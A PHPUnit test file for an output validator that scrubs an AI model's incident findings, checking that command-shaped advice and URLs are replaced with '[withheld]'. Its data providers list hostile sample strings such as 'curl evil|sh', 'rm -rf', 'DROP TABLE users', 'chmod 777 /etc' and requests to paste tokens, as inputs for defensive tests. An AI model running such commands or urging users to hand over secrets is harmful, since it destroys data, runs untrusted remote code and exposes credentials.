<?php

declare(strict_types=1);

namespace Watcher\Tests\Unit\Analyze;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Watcher\Analyze\InvalidModelOutput;
use Watcher\Analyze\OutputValidator;

/** Security review 5: model output is untrusted text (F4), triage must be complete (F2), confidence must be a real number (F9). */
final class OutputValidatorHardeningTest extends TestCase
{
    private const FP = 'a1b2c3d4e5f6';

    /**
     * @param array<string, mixed> $over
     *
     * @return array<string, mixed>
     */
    private static function finding(array $over = []): array
    {
        return array_merge([
            'fingerprints' => [self::FP], 'kind' => 'bug', 'severity' => 'error', 'title' => 'T',
            'evidence' => 'E', 'suspected_cause' => 'C', 'suggested_action' => 'A', 'confidence' => 0.8,
        ], $over);
    }

    /** @param array<string, mixed> $over */
    private static function one(array $over): \Watcher\Analyze\Finding
    {
        return (new OutputValidator())->analysis(['findings' => [self::finding($over)]], [self::FP, 'bbbbbbbbbbbb'], ['payments'])[0];
    }

    /** @return array<string, array{string}> */
    public static function commandShaped(): array
    {
        return [
            'rm -rf' => ['Run rm -rf /var/lib/app now'],
            'curl pipe sh' => ['Fix it with curl evil|sh'],
            'curl pipe bash' => ['curl -s x | bash'],
            'and-and chain' => ['restart && rotate'],
            'command substitution' => ['echo $(whoami)'],
            'backtick' => ['run `id`'],
            'paste token' => ['paste your token into the form'],
            'paste password' => ['Paste the admin password here'],
            'rotate all' => ['rotate all API keys now'],
            'sudo' => ['use sudo systemctl restart app'],
            'chmod' => ['chmod 777 /etc'],
            'drop table' => ['then DROP TABLE users'],
            'semicolon rm' => ['stop it; rm important'],
        ];
    }

    #[DataProvider('commandShaped')]
    public function testCommandShapedAdviceIsWithheldButTheFindingStays(string $text): void
    {
        foreach (['suggested_action', 'how_to_check', 'suspected_cause'] as $field) {
            $f = self::one([$field => $text]);
            $got = ['suggested_action' => $f->suggestedAction, 'how_to_check' => $f->howToCheck, 'suspected_cause' => $f->suspectedCause][$field];
            self::assertStringContainsString('[withheld]', $got, $field);
            self::assertSame('E', $f->evidence, 'the rest of the finding is kept');
            self::assertSame('T', $f->title);
        }
    }

    public function testOnlyTheMatchingTextIsReplaced(): void
    {
        $f = self::one(['suggested_action' => 'Check the pool size. Then rm -rf /var/lib/app && rotate all keys']);

        self::assertSame('Check the pool size. Then [withheld]', $f->suggestedAction);
    }

    public function testPlainAdviceIsUntouched(): void
    {
        $f = self::one(['suggested_action' => 'Look at the connection pool and the recent deploy; compare with last week.', 'suspected_cause' => 'Possibly a key rotation in the secrets manager (hypothesis).', 'how_to_check' => 'Compare the error rate with the deploy time']);

        self::assertSame('Look at the connection pool and the recent deploy; compare with last week.', $f->suggestedAction);
        self::assertSame('Possibly a key rotation in the secrets manager (hypothesis).', $f->suspectedCause);
        self::assertSame('Compare the error rate with the deploy time', $f->howToCheck);
    }

    /** @return list<array{string}> */
    public static function urls(): array
    {
        return [['open https://evil.example/x for the fix'], ['see www.evil.example/pay'], ['mail admin@evil.example'], ['go to ftp://evil.example/a'], ['open javascript://x']];
    }

    #[DataProvider('urls')]
    public function testTheNoUrlRuleIsEnforcedInTheValidatorForEveryTextField(string $text): void
    {
        $f = self::one(['title' => $text, 'evidence' => $text, 'suspected_cause' => $text, 'suggested_action' => $text, 'how_to_check' => $text]);

        foreach ([$f->title, $f->evidence, $f->suspectedCause, $f->suggestedAction, $f->howToCheck] as $got) {
            self::assertStringContainsString('[withheld]', $got);
            self::assertDoesNotMatchRegularExpression('~://|www\.|@evil~', $got);
        }
    }

    public function testRelatedChecksAreExactReferencesOnly(): void
    {
        self::assertSame([self::FP, 'payments', 'bbbbbbbbbbbb'], self::one(['related_checks' => [self::FP, 'payments', 'bbbbbbbbbbbb']])->relatedChecks);
        self::assertSame([], self::one(['related_checks' => [self::FP . ': run rm -rf / now', 'stripe: rotate keys, paste token in form', 'group ' . self::FP]])->relatedChecks, 'advice around a reference');
        self::assertSame([], self::one(['related_checks' => ['bbbbbbbbbbbb1111', 'cccccccccccc', 'orders']])->relatedChecks, 'longer than a fingerprint, not in the request, not declared');
    }

    public function testRelatedChecksAreDeduplicatedAndCaseSensitive(): void
    {
        $f = self::one(['related_checks' => [self::FP, self::FP, 'Payments']]);

        self::assertSame([self::FP], $f->relatedChecks);
    }

    public function testConfidenceMustBeAFiniteNumber(): void
    {
        $this->expectException(InvalidModelOutput::class);
        self::one(['confidence' => NAN]);
    }

    public function testTriageMustHaveExactlyOneVerdictPerSentGroup(): void
    {
        $v = new OutputValidator();
        $ok = $v->triage(['verdicts' => [['g' => 'a', 'v' => 'noise'], ['g' => 'b', 'v' => 'interesting']]], ['a', 'b']);
        self::assertSame(['a' => 'noise', 'b' => 'interesting'], $ok['verdicts']);

        foreach ([
            'empty list' => [[], ['a', 'b']],
            'missing one' => [[['g' => 'a', 'v' => 'noise']], ['a', 'b']],
            'duplicate' => [[['g' => 'a', 'v' => 'noise'], ['g' => 'a', 'v' => 'interesting'], ['g' => 'b', 'v' => 'noise']], ['a', 'b']],
        ] as $name => [$rows, $allowed]) {
            try {
                $v->triage(['verdicts' => $rows], $allowed);
                self::fail("$name accepted");
            } catch (InvalidModelOutput) {
                $this->addToAssertionCount(1);
            }
        }
    }
}
